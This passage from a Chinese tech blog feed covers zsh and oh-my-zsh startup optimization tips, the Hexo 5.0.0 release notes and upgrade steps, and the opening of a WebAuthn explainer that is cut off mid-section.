CLI</a>），lazyload nvm 也是不现实的。我不得不寻找另一个代替 nvm 的 Node.js 版本管理器，最后我选中了 <a href=\"https://github.com/tj/n\"><code>tj/n</code></a>。</p>\n<p>首先是卸载 nvm、nvm 安装的所有 Node.js 版本、以及 zsh-nvm 插件：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># 卸载 nvm 及其安装的 Node.js</span>$ rm -rf <span class=\"hljs-variable\">$HOME</span>/.nvm<span class=\"hljs-comment\"># 删除 zsh-nvm 插件</span>$ rm -rf <span class=\"hljs-variable\">$ZSH</span>/custom/plugins/zsh-nvm<span class=\"hljs-comment\"># 除了删除目录，还需要在 .zshrc 中的 plugins 数组中删除 zsh-nvm</span></code></pre>\n<p>接着安装 <code>tj/n</code> 作为 Node.js 版本管理器，macOS 上可以通过 Homebrew 直接安装：</p>\n<pre><code class=\"hljs bash\">$ brew install n</code></pre>\n<p>在 <code>.zshrc</code> 中配置 <code>tj/n</code>：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># tj/n 的路径</span><span class=\"hljs-built_in\">export</span> N_PREFIX=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">$HOME</span>/.n\"</span><span class=\"hljs-comment\"># 当切换 Node.js 版本时保留 npm</span><span class=\"hljs-built_in\">export</span> N_PRESERVE_NPM=1<span class=\"hljs-comment\"># 将 tj/n 添加到 PATH</span><span class=\"hljs-built_in\">export</span> PATH = <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$N_PREFIX</span>/bin:<span class=\"hljs-variable\">$PATH</span>\"</span></code></pre>\n<h2>使用 zsh 内置语法</h2>\n<p>zsh 强大之处不仅在于内建的插件、优雅的使用方式，更重要的是极其强大的语法。在 <code>.zshrc</code> 广泛使用 zsh 内置的语法可以大幅提高执行性能。</p>\n<h3>zsh 判断命令是否存在</h3>\n<p>我们经常需要在 <code>.zshrc</code> 之中编写命令是否存在的条件语句，比如「仅当命令存在时加载该命令的自动补全」，或者「当 Node.js 存在时输出 Node.js 版本」。通常情况下我们会写出以下三种条件判断方式：</p>\n<pre><code class=\"hljs bash\">[[ <span class=\"hljs-built_in\">command</span> -v node &amp;&gt;/dev/null ]] &amp;&amp; node -v[[ <span class=\"hljs-built_in\">which</span> -a node &amp;&gt;/dev/null ]] &amp;&amp; node -v[[ <span class=\"hljs-built_in\">type</span> node &amp;&gt;/dev/null ]] &amp;&amp; node -v</code></pre>\n<p>但是在 zsh 中，还有一种速度更快的判断命令存在的方法：</p>\n<pre><code class=\"hljs bash\">(( $+commands[node] )) &amp;&amp; node -v</code></pre>\n<p>zsh 提供了一个数组元素查找语法 <code>$+array[item]</code> （元素存在则返回 1 否则返回 0），同时 zsh 也维护了一个命令数组 <code>$commands</code>，在数组中检索元素比调用 <code>which</code>、<code>type</code>、<code>command -v</code> 命令都要快许多。</p>\n<h3>变量字符串查找</h3>\n<p>在 <code>.zshrc</code> 中鲜少需要用到这样的语法，不过依然存在一些 case，比如为了避免向 <code>$FPATH</code> 中重复添加 Homebrew 的自动补全，提前检查 <code>$FPATH</code> 中是否已经包含了 Homebrew 的路径。一般常见的写法都涉及到 <code>echo</code> 和 <code>grep</code> ：</p>\n<pre><code class=\"hljs bash\">[[ $(<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">$FPATH</span> | grep <span class=\"hljs-string\">\"/usr/local/share/zsh/site-functions\"</span>) ]] &amp;&amp; <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"homebrew exists in fpath\"</span></code></pre>\n<p>但是在 zsh 中我们不需要 <code>grep</code> 也可以实现同样的功能：</p>\n<pre><code class=\"hljs bash\">(( <span class=\"hljs-variable\">$FPATH</span>[(I)/usr/<span class=\"hljs-built_in\">local</span>/share/zsh/site-functions] )) &amp;&amp; <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"homebrew exists in fpath\"</span></code></pre>\n<p>zsh 内置了在变量中匹配字符串的语法：<code>$variable[(i)keyword]</code> 和 <code>$variable[(I)keyword]</code>，前者是从左往右寻找、后者是从右往左寻找，返回值为第一个匹配的首字符位置，当没有匹配时返回值则是变量的最终位置，也就是说当找不到匹配时 <code>(i)</code> 会返回字符串的长度、而 <code>(I)</code> 会返回 0。因此只需要从右往左寻找、判断返回值是否为 0 即可，搭配将数字转化为布尔值的 <code>(( ))</code> 就可以写出又快又漂亮的条件语句。</p>\n<h3>变量字符串替换</h3>\n<p>当需要截断或者替换字符串时，大部分人第一时间会想到 <code>sed</code> ，因当此需要替换变量中的字符时自然而然的会使用 <code>echo | sed</code>。比如，在 macOS 中主机名 <code>$HOST</code> 变量通常以 <code>.local</code> 结尾：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">$HOST</span>Sukka-MBP.local</code></pre>\n<p>如果要显示 <code>Sukka-MBP</code> （在 prompt 中常常会用到）就需要写成：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">$HOST</span> | sed -e <span class=\"hljs-string\">\"s/.local//\"</span>Sukka-MBP</code></pre>\n<p>但是，强大的 zsh 内置了简单的变量字符串替换语法，使用下述命令可以达到相同的效果：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${HOST/.local/}</span>Sukka-MBP$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${HOST/.local/.foxtail}</span>Sukka-MBP.foxtail</code></pre>\n<h2>其它优化手段</h2>\n<h3>禁用多余的插件</h3>\n<p>oh my zsh 在 Wiki 里说「Add wisely, as too many plugins slow down shell startup」。通过 profiling 可以发现一些插件（如 <code>git</code> 插件）执行耗时也不短。考虑到 oh my zsh 内置的 <code>git</code> 插件只是一些 alias、大部分我都用不到，因此将其从 <code>plugins</code> 数组中移除。</p>\n<h3>避免产生子进程</h3>\n<p>在 shell 中有不少语法会产生子进程。由于这些不受控制的子进程可能会产生其它子进程、从而导致潜在的巨大开销。常见的会产生子进程的语法有是 <code>eval</code> 和 Command substitution，在编写 <code>.zshrc</code> 时应该尽量避免使用它们。</p>\n<p>例如，Homebrew 是通过 Ruby —— 一种没有性能优势的语言编写的，而且 Homebrew 的开发者甚至因为不会翻转二叉树而错失了 Google 的 offer（想必大家大体可以猜得出 Homebrew 中的负优化），因此在 zsh 启动时产生一个子进程运行 Homebrew 将是不能忍受的，绝大部分使用 Homebrew 的人都不会改变 Homebrew 的路径，因此与其在 <code>.zshrc</code> 中使用 <code>$(brew --prefix)</code>，不如直接将命令执行的结果（<code>/usr/local</code>）直接写在 <code>.zshrc</code> 中。</p>\n<h3>启用 ZSH_DISABLE_COMPFIX</h3>\n<p>oh my zsh 内置了安全功能、避免 oh my zsh 插件使用不安全的目录和文件，但是这意味着插件在加载时需要通过一系列 security checker。通过禁用安全功能 （<code>export ZSH_DISABLE_COMPFIX=\"true\"</code>）可以使 zsh 启动速度加快 0.06s。微不足道，但值得一试。</p>\n<h2>针对 macOS 的优化</h2>\n<h3>path_helper</h3>\n<p>和 Linux 不同，在 macOS 上 zsh 启动序列的第一项为 <code>/etc/zprofile</code> 而不是 <code>~/.zprofile</code>。macOS 通过 <code>/etc/zprofile</code> 来调用 <code>path_helper</code>：</p>\n<pre><code class=\"hljs bash\">$ cat /etc/zprofile<span class=\"hljs-comment\"># System-wide .profile for sh(1)</span><span class=\"hljs-keyword\">if</span> [ -x /usr/libexec/path_helper ]; <span class=\"hljs-keyword\">then</span>  <span class=\"hljs-built_in\">eval</span> `/usr/libexec/path_helper -s`<span class=\"hljs-keyword\">fi</span><span class=\"hljs-keyword\">if</span> [ <span class=\"hljs-string\">\"<span class=\"hljs-variable\">${BASH-no}</span>\"</span> != <span class=\"hljs-string\">\"no\"</span> ]; <span class=\"hljs-keyword\">then</span>  [ -r /etc/bashrc ] &amp;&amp; . /etc/bashrc<span class=\"hljs-keyword\">fi</span></code></pre>\n<p>而 <code>path_helper</code> 又会读取 <code>/etc/paths</code> 、<code>/etc/paths/d</code>、<code>etc/manpaths</code> 和  <code>etc/manpaths.d</code>、并将其添加到 <code>$PATH</code> 和 <code>$MANPATH</code> 变量中。通过 <code>path_helper</code> macOS 提供了一种快速在不同 shell 中共享  <code>$PATH</code> 和 <code>$MANPATH</code> 的方法。过去，<code>path_helper</code> 是一个 <a href=\"https://mjtsai.com/blog/2009/04/01/slow-opening-terminal-windows\">运行速度很慢的 shell 脚本</a> 以至于有人制作了 <a href=\"https://gist.github.com/mkhl/123525\">专门的 patch</a>、甚至 <a href=\"https://github.com/mgprot/path_helper\">使用 Perl</a> 重写了一个替代品。不过 macOS 意识到了这个问题，现在 <code>path_helper</code> 不再是一个脚本而是一个预编译好的二进制文件。如果你通过 profiling 发现 <code>path_helper</code> 有在拖累 zsh 启动，那么可以考虑放弃使用 <code>/etc/paths/d</code>、而是在 <code>.zshrc</code> 中直接维护 <code>$PATH</code>。</p>\n<h3>login process</h3>\n<p>默认在启动、终端登陆 shell 时会触发 macOS 的 <code>login -fp username</code>。这一操作会调用 <code>syslog()</code> 函数向 <code>/var/log/asl</code> 写入日志、并读取上一次登录记录、以 <code>Last login</code> 的形式显示出来。你可以使用下述命令证实这一行为：</p>\n<pre><code class=\"hljs bash\">ps -ef | grep login</code></pre>\n<p>如果想要通过减少日志写入来加快 zsh 启动速度，可以修改 <code>etc/asl.conf</code> 配置文件中定义的日志等级。</p>\n<p>不少文章也提到，修改 iTerm2 设置中的 <code>Login Command</code> 为 <code>/bin/zsh</code> 可以加快 zsh 启动速度，本质上也是绕过了上述读取和写入日志的环节。</p>\n<blockquote><p>ASL 即 <strong>A</strong>pple <strong>S</strong>ystem <strong>L</strong>og，macOS 10.12 起被弃用，但是仍有系统组件在使用这一接口。</p></blockquote>\n<h2>尾声</h2>\n<p>经过一系列优化，我终于让 zsh 启动速度提升了十倍，速度甚至不亚于 fish 等以性能著称的 shell：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> $(seq 1 5); <span class=\"hljs-keyword\">do</span> /usr/bin/time /bin/zsh -i -c <span class=\"hljs-built_in\">exit</span>; <span class=\"hljs-keyword\">done</span>        0.14 real         0.08 user         0.05 sys        0.12 real         0.07 user         0.04 sys        0.12 real         0.07 user         0.04 sys        0.13 real         0.07 user         0.04 sys        0.13 real         0.07 user         0.04 sys</code></pre>\n<p>如果对我的 <code>.zshrc</code> 文件感兴趣，可以 <a href=\"https://github.com/SukkaW/dotfiles/blob/master/_zshrc/macos.zshrc\">前往 GitHub 查看我开源的 dotfiles</a>。</p>\n<div class=\"license\"> <div class=\"license-title\">我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/make-oh-my-zsh-fly/\">https://blog.skk.moe/post/make-oh-my-zsh-fly/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-08-10</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/make-oh-my-zsh-fly/"},{"title":"Hexo 5.0.0 正式发布","date":"2020-07-24 02:24:00","description":"\n<p>Node.js 上最快的静态站点生成器 Hexo 发布了 5.0.0 版本。作为 Hexo 核心团队成员，让我为大家介绍一下 Hexo 5.0.0 中的新特性，以及如何从 Hexo 4.x 版本升级到 Hexo 5.0.0。</p>\n<h2>新特性</h2>\n<h3>通过 npm 安装主题</h3>\n<p>过去，安装 Hexo 主题需要 <code>git clone</code> 或者下载、解压 zip；更新主题时还需要迁移 <code>_config.yml</code> 。Hexo 5.0.0 支持通过 npm 安装主题。现在安装一个主题只需要三步：</p>\n<ul>\n<li><p>使用  <code>npm install hexo-theme-[主题的名称]</code> 即可安装主题；</p></li>\n<li>\n<p>在站点的 <code>_config.yml</code> 中指定主题的名称：<br><br></p>\n<pre><code class=\"hljs yaml\"><span class=\"hljs-attr\">theme:</span> <span class=\"hljs-string\">\"[主题的名称]\"</span></code></pre>\n</li>\n<li><p>在站点根目录下新建一个文件 <code>_config.[主题的名称].yml</code>，在该文件中填入主题的配置即可。</p></li>\n</ul>\n<p>对于主题的开发者、插件开发者，以及进阶的 Hexo 用户来说，这是你们想要了解的技术细节：</p>\n<ul>\n<li>为了保证向后兼容性，Hexo 依然支持从 <code>themes/[主题的名称]</code> 目录加载主题。其中，<code>themes/[主题的名称]</code> 的优先级高于 <code>node_modules/hexo-theme-[主题的名称]</code>。也就是说，只有当 Hexo 发现 <code>themes/[主题的名称]</code> 目录不存在时，才会从  <code>node_modules/hexo-theme-[主题的名称]</code> 目录中加载主题。</li>\n<li>Hexo 5.0.0 新增了通过站点根目录下 <code>_config.[主题的名称].yml</code> 文件配置主题的功能。这是除主题目录下的 <code>_config.yml</code> 文件、以及站点配置文件的 <code>theme_config</code> 字段外第三种配置主题的方式。</li>\n<li>为保证向后兼容性，Hexo 会按照如下优先级 deep merge 三份主题配置：<code>站点配置文件的 theme_config 字段 &gt; 站点根目录下的 _config.[主题的名称].yml &gt; 主题目录下的 _config.yml</code>。因此，我们建议主题开发者尽量限制配置文件层级为 1 级，避免在 deep merge 时更深层级的配置项会被合并而不是被覆盖。</li>\n</ul>\n<h3>PrismJS 代码高亮支持</h3>\n<p>Hexo 5.0.0 新增了 PrismJS 代码高亮支持。</p>\n<p>相比 highlight.js 可以在 Node.js 环境执行（即：可在 Hexo 生成页面时进行代码高亮）不同，PrismJS 是一个轻量级的代码高亮库，绝大部分插件都依赖浏览器中执行。Hexo 为了尽可能兼容 PrismJS 的功能和插件，提供了「生成时渲染」和「浏览器渲染」两种模式：前者只需在主题之中引入 PrismJS 的 CSS 即可，但是无法使用大部分 PrismJS 的插件；后者需要在主题中同时引入 PrismJS 的 CSS 和 <code>prism.js</code>，但是可以兼容 PrismJS 大部分插件。</p>\n<p>关于 Hexo 主题的开发者适配 Hexo 的两种代码高亮的技术细节，我们专门撰写了 <a href=\"https://hexo.io/docs/syntax-highlight\">相关的文档页面</a> 以供参考。</p>\n<h3>静态 HTML 片段插入</h3>\n<p>插件开发者经常需要在页面中插入 HTML 片段：播放器插件需要往页面中插入 <code>player.css</code> 和 <code>player.js</code>，lazyload 插件的作者需要往页面中插入 <code>lazyload.js</code>，Live2D 插件的作者需要往页面中插入对应的 CSS 和 JS，等等。Hexo 5.0.0 新增了一个插件 API 接口 <code>Injector</code>，用于往页面的 <code>&lt;head&gt;</code> 和 <code>&lt;body&gt;</code> 标签中注入静态 HTML 片段。这一功能支持：</p>\n<ul>\n<li>在 <code>&lt;head&gt;</code> 之后、<code>&lt;/head&gt;</code> 之前、<code>&lt;body&gt;</code> 之后 和 <code>&lt;/body&gt;</code> 之前四个位置插入代码。</li>\n<li>支持只在特定页面注入 HTML 片段 —— 插件开发者可以仅往文章页面插入 HTML 片段而不影响其他页面如首页和归档。</li>\n</ul>\n<p>插件开发者请参考 Hexo 的 [Injector API 文档] 了解具体使用方法。</p>\n<h3>其他新特性</h3>\n<p>除上述三个重磅功能外，Hexo 还新增了其他功能，如：</p>\n<ul>\n<li>标签插件 API 新增 <code>unregister</code>å 方法</li>\n<li>\n<code>tagcloud</code> 辅助函数新增支持自定义 class 属性和 level</li>\n<li>\n<code>feed_tag</code> 辅助函数增加对 hexo-generator-feed 插件的兼容</li>\n<li>\n<code>youtube</code> 标签插件新增对 YouTube 播放列表的支持，以及可选使用 <code>www.youtube-nocookie.com</code> 域名</li>\n<li>\n<code>post_link</code> 标签插件在找不到对应文章时将会显示警告信息</li>\n<li>\n<code>post_permalink</code> 配置项新增支持 <code>:second</code> 属性</li>\n<li>当文章的标签插件出现渲染错误时，报错信息将会显示出错文件的路径</li>\n</ul>\n<h2>修复的 Bug</h2>\n<ul>\n<li>修复了 数个相邻的标签插件 无法渲染的 Bug</li>\n<li>修复了 文章中的代码块由于包含大括号（<code>{</code> 和 <code>}</code>）导致的渲染失败</li>\n<li>修复了 包含 Source Map 的 Hexo 插件无法加载的 Bug</li>\n<li>修复了 <code>code</code> 标签插件无法解析 <code>wrap</code> 选项的问题</li>\n<li>当 <code>post_asset_folder</code> 功能启用时，<code>hexo new</code> 命令将不再生成错误的 <code>index</code> 目录</li>\n</ul>\n<h2>性能改进</h2>\n<p>一如既往，Hexo 5.0.0 也带来了一系列性能改进，以提升 Hexo 的渲染性能。</p>\n<ul>\n<li>改进了标签插件的渲染性能</li>\n<li>优化了 <code>meta[generator]</code> 标签注入的逻辑</li>\n<li>优化为外部链接添加 <code>rel=noopenner</code> 和 <code>target=\"_blank\"</code> 功能的性能</li>\n<li>确保 <code>after_render:html</code> Filter 在每个页面只执行一次</li>\n<li>优化了 Filter API 的执行速度</li>\n<li>延迟加载代码高亮，减少 Hexo 启动用时</li>\n<li>当执行 <code>hexo clean</code> 时不再加载无关的插件</li>\n</ul>\n<h2>从 Hexo 4.x 升级到 Hexo 5.x</h2>\n<p>Hexo 5.0.0 引入了少数不向后兼容的功能，因此当你升级到 Hexo 5.0.0 时，需要遵循以下步骤进行迁移：</p>\n<h3>升级 Node.js</h3>\n<p>Hexo 5.0.0 不再支持 Node.js 8 及更低版本。为了使用 Hexo 5.0.0，请确保 Node.js 版本不低于 10.13.0。</p>\n<h3>文章 Front-Matter 不再支持 keywords 字段</h3>\n<p>过去这一字段被主要用于 <code>open_graph</code> 辅助函数。升级到 Hexo 5.0.0 后你无需去除现有文章的 Front-Matter 中的 <code>keywords</code> 字段，但这一字段将不会再起任何作用。</p>\n<h3>文章 Front-Matter 中 permalink 字段的行为</h3>\n<p>Hexo 5.0.0 修改了在文章的 Front Matter 中指定 <code>permalink</code> 字段的行为，与独立页面的 <code>permalink</code> 的行为一致。</p>\n<h3>全局变量中不再包含 Lodash</h3>\n<p>Hexo 5.0.0 去除了全局变量中的 Lodash，因此主题无法继续在模板中使用 Lodash。主题开发者应该遵循 <a href=\"https://github.com/you-dont-need/You-Dont-Need-Lodash-Underscore\">You-Dont-Need-Lodash-Underscore</a> 进行迁移。</p>\n<h3>用 updated_option 配置代替 use_date_for_updated</h3>\n<p>Hexo 4.0.0 提供的 <code>use_date_for_updated</code> 配置项现已被 <code>updated_option</code> 替代。</p>\n<ul>\n<li>\n<code>use_date_for_updated: true</code> 现在等价于 <code>updated_option: 'date'</code>。</li>\n<li>\n<code>use_date_for_updated: false</code> 现在等价于 <code>updated_option: 'mtime'</code>。</li>\n</ul>\n<div class=\"license\"> <div class=\"license-title\">Hexo 5.0.0 正式发布</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/hexo-5/\">https://blog.skk.moe/post/hexo-5/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-07-24</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/hexo-5/"},{"title":"谈谈 WebAuthn","date":"2020-03-23 14:57:59","description":"\n<p>WebAuthn，即 Web Authentication，是一个用于在浏览器上进行认证的 API，W3C 将其表述为 “An API for accessing Public Key Credentials”，即“一个用于访问公钥凭证的 API”。WebAuthn 很强大，强大到被认为是 Web 身份认证的未来（当然，也很复杂）。你有想过通过指纹或者面部识别来登录网站吗？WebAuthn 就能在保证安全和隐私的情况下让这样的想法成为现实。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/wwa.gif\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/wwa.gif?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"通过 WebAuthn 调起 Windows Hello 登录网站\" width=\"1912\" height=\"966\" class=\"aligncenter size-full wp-image-2215\"></a>\n<p>你可以在<a href=\"https://webauthn.io/\" rel=\"noopener\">这个网站</a>自行体验 WebAuthn。或者，如果你有一个使用 WordPress 的站点，可以尝试一下 <a href=\"https://wordpress.org/plugins/wp-webauthn/\">WP-WebAuthn</a> 这款插件，它可以为你的站点启用 WebAuthn 登录。这是我为了写这篇文章而练手开发的插件，本文中的部分示例代码也来自这款插件。</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"yrccondor\" data-mdxgithubp=\"wp-webauthn\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/yrccondor/wp-webauthn\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<p>WebAuthn Level 1 标准已在 2019 年 3 月成为 W3C 推荐标准，而 Level 2 标准目前也已进入编辑草案阶段，但互联网上有关它的中文资料却仍然很少，国内也鲜有网站支持这一新标准。于是，在抱着各种英文资料和标准啃了几天以后，我折腾出了这篇文章。</p>\n<p>在这篇文章里，我将会从最基本的概念开始，逐渐深入 WebAuthn，直到解码公钥等深层细节。这可能是你能找到的有关 WebAuthn 最详细最基础的中文文章，也很可能是最长的。在开始之前，<strong>我强烈建议你打开菜单中的文章目录浏览一遍，以对这篇文章涉及的内容有所了解。</strong>如果你只是想了解如何简单地在你的项目中添加对 WebAuthn 的支持，那么“<a href=\"https://flyhigher.top/#webauthn-overview\">浅谈 WebAuthn</a>”部分就是你要找的；如果你想了解更多关于 WebAuthn 的底层细节，那么你可以继续阅读“<a href=\"https://flyhigher.top/#deep-into-webauthn\">深入了解 WebAuthn</a>”部分。</p>\n<p>由于在本文写作时 WebAuthn Level 2 规范尚未定稿，<strong>这篇文章我们将只专注于 Level 1 规范。</strong></p>\n<p>这篇文章最后更新于 2020.9 ，在你读到这篇文章时，部分事实可能已经发生改变，请注意判断。</p>\n<p><strong>更新日志：</strong></p>\n<ul>\n<li>2021.1.16 添加 Chrome 开发工具信息</li>\n<li>2020.9.17 更新 iOS/iPad OS 兼容性信息</li>\n<li>2020.5.20 添加部分无用户名认证的平台兼容性内容</li>\n<li>2020.5.15 添加部分 <code>extensions</code> 相关内容与链接；添加全局凭证 ID 唯一内容；添加凭证 ID 查找相关内容；添加“从 U2F 认证迁移”一节</li>\n<li>2020.4.13 更新与修正 <code>userVerification</code> 相关内容；添加部分 Firefox 相关内容</li>\n<li>2020.3.23 文章发布</li>\n</ul>\n<p>那么让我们开始吧。<span></span></p>\n<h1>浅谈 WebAuthn</h1>\n<p>在这个部分里，我们将会从基础概念开始，了解有关 WebAuthn 和密码学的一些基础知识，并最终使用第三方库实现基础的 WebAuthn 认证。如果你已经对这些内容有所了解了，可以跳到“<a href=\"https://flyhigher.top/#deep-into-webauthn\">深入了解 WebAuthn</a>”继续阅读。</p>\n<h2>为什么使用 WebAuthn</h2>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/2.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/2.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"钓鱼邮件\" width=\"709\" height=\"693\" class=\"aligncenter size-full wp-image-2162\"></a>\n<p>相信你一定收到过类似的邮件吧？只要你点进那个最显眼的链接，你就会进入一个设置好的圈套——钓鱼网站。如果你一时糊涂在这类网站上填写了你的账号和密码，bingo，你的账号就不再是你的账号了。</p>\n<p>不过，就算你警惕心再强，也无法避免密码泄露事件。Twitter, Facebook 等都爆出过明文密码泄露事件，证明再大的公司或组织也无法避免密码泄露问题。雪上加霜的是，很大一部分用户都非常喜欢使用重复密码，这就导致一次密码泄露会牵连很多网站，用户的账户安全性完全无法得到保证。</p>\n<p>那么，有什么办法解决这些问题吗？<strong>彻底解决的方法只有一个，那就是抛弃密码。</strong>可是没有密码还怎么验证用户身份呢？这就是 WebAuthn 的用武之地了。</p>\n<p><del>没有密码的好时代，来临力！</del></p>\n<h2>什么是 WebAuthn</h2>\n<p>那么到底什么是 WebAuthn 呢？如开头所说，WebAuthn 是“一个用于访问公钥凭证的 API”，网站可以通过这个 API 进行一些高安全性的身份验证。WebAuthn 一个最常见的应用就是用于网站登录时的 2FA（双重因素验证）甚至是无密码登录。通过网页调用 WebAuthn，在不同平台下，<strong>我们可以实现通过 USB Key、指纹、面部甚至虹膜扫描来认证身份，同时确保安全和隐私。</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/4-3.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/4-3.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"WebAuthn 可使用的各种身份认证方式\" width=\"1294\" height=\"566\" class=\"aligncenter size-full wp-image-2213\"></a>\n<p>WebAuthn 标准是 FIDO2 标准的一部分，而 FIDO2 则是由 FIDO 联盟和 W3C 共同推出的 U2F（现称作 FIDO1）的后继标准，旨在增强网络认证的安全性。</p>\n<blockquote><p>你可能了解过 U2F，那么 U2F 和 FIDO2 的区别在哪里呢？从名字上可以看出，U2F，即“通用第二因素协议”，是专注于作为密码后的第二道屏障的，而 FIDO2 增加了单因素认证功能，这意味着使用 FIDO2 可以完全替代密码，真正实现无密码登录。</p></blockquote>\n<p>FIDO2 标准主要包括四个部分，其一是用于网站和访客设备交互的 WebAuthn，而 Client to Authenticator Protocol 2（CTAP2，客户端-认证器协议）作为 WebAuthn 的补充，则是用于访客的设备和认证器交互的协议。标准的其他两个部分则是 U2F 和 UAF 规范。在这篇文章中，我们只关心 WebAuthn，不会涉及 CTAP, U2F 和 UAF 的相关知识。如果你对这段话中的一些概念不了解，不要紧张，接下来我们就来谈谈 WebAuthn 中一些常用的术语和概念。</p>\n<blockquote><p>WebAuthn 只能在安全上下文中使用，也就是说，页面需要使用 HTTPS 协议或是处于 <code>localhost</code> 中。</p></blockquote>\n<h2>常用术语和概念</h2>\n<p>WebAuthn 中有许多不常碰到的术语，不过我只会在这里介绍一些常用的术语和概念——如果你只是希望做出一个简单的实现，那么了解这一段中的一些概念就足够了。同时，由于我实在没能找到一部分术语的通用翻译，有一些术语我按着自己的理解尽可能地翻译了，有任何问题请告诉我。</p>\n<p>在一个完整的 WebAuthn 认证流程中，通常有这么几个角色：</p>\n<ul>\n<li>Relying Party 依赖方 (RP) ：指服务提供方，即网站</li>\n<li>User 用户：正准备登录的你</li>\n<li>Authenticator 认证器：通常指 USB Key 或是设备内置的指纹扫描器、虹膜扫描器、面部识别装置等，正是它们在使用流程中代替了密码甚至是用户名</li>\n<li>User Agent 用户代理：通常指浏览器或系统，负责与认证器交互</li>\n</ul>\n<p>认证过程通常分为两种：</p>\n<ul>\n<li>Registration Ceremony 注册仪式：用户向账户上添加认证器</li>\n<li>Authentication Ceremony 验证仪式：用户通过已注册的认证器验证身份</li>\n</ul>\n<p>同时，认证过程中还会产生这些内容：</p>\n<ul>\n<li>Challenge 挑战：通常是一串随机字符串</li>\n<li>Public Key Credential 公钥凭证：由认证器产生的凭证，在技术上代替了密码</li>\n<li>Attestation 证明：注册时认证器产生的验证数据</li>\n<li>Assertion 断言：验证时认证器产生的验证数据</li>\n</ul>\n<blockquote><p><strong>请注意区分证明 (Attestation) 和断言 (Assertion)</strong>，特别是在这两个单词有些相似的情况下。在 WebAuthn 中，它们是不同过程中的类似概念，但并不相同。</p></blockquote>\n<p>如果你对于这些内容不是很理解，没有关系，我们会在“<a href=\"https://flyhigher.top/#how-to-webauthn\">使用流程</a>”一节中将这些概念放到实际情况中解释，你只要先区分这些概念即可。</p>\n<h2>安全性的基础</h2>\n<p>WebAuthn 为什么安全？和 HTTPS 一样，WebAuthn 使用非对称加密的思路来保证安全性，但侧重点又有所不同。要理解 WebAuthn 的认证流程，我们必须对非对称加密有所了解。如果你对非对称加密比较熟悉了，就直接跳到下一段吧。</p>\n<p>WebAuthn 的核心在于“认证”，即保证产生了凭证的认证器是用户的认证器，而不是第三方在伪造凭证。但为什么要使用非对称加密呢？我们可以先来看看对称加密。</p>\n<p>让我们假设小明和小红相互写信，见不到对方。这天小红突然想，给自己写信的人是不是真的小明呢？于是小红要求对方向小红证明自己是小明。怎么证明呢？他们商量出来这么一套方案：</p>\n<ol>\n<li>在小明的身份已经验证的情况下，小明和小红商量一个统一的密码和密钥</li>\n<li>一段时间后，在小红要求小明验证身份时，小红发送一段文本给小明</li>\n<li>小明用提前和小红商量好的密码和密钥加密文本后发回给小红</li>\n<li>小红使用相同的密码和密钥解密文本，如果得到文本和之前发送的一致，就表明对方拥有正确的密码和密钥</li>\n</ol>\n<blockquote><p>在密码学中，我们通常把“加密算法”称为密码 (code)，和通常登录时用的密码 (password) 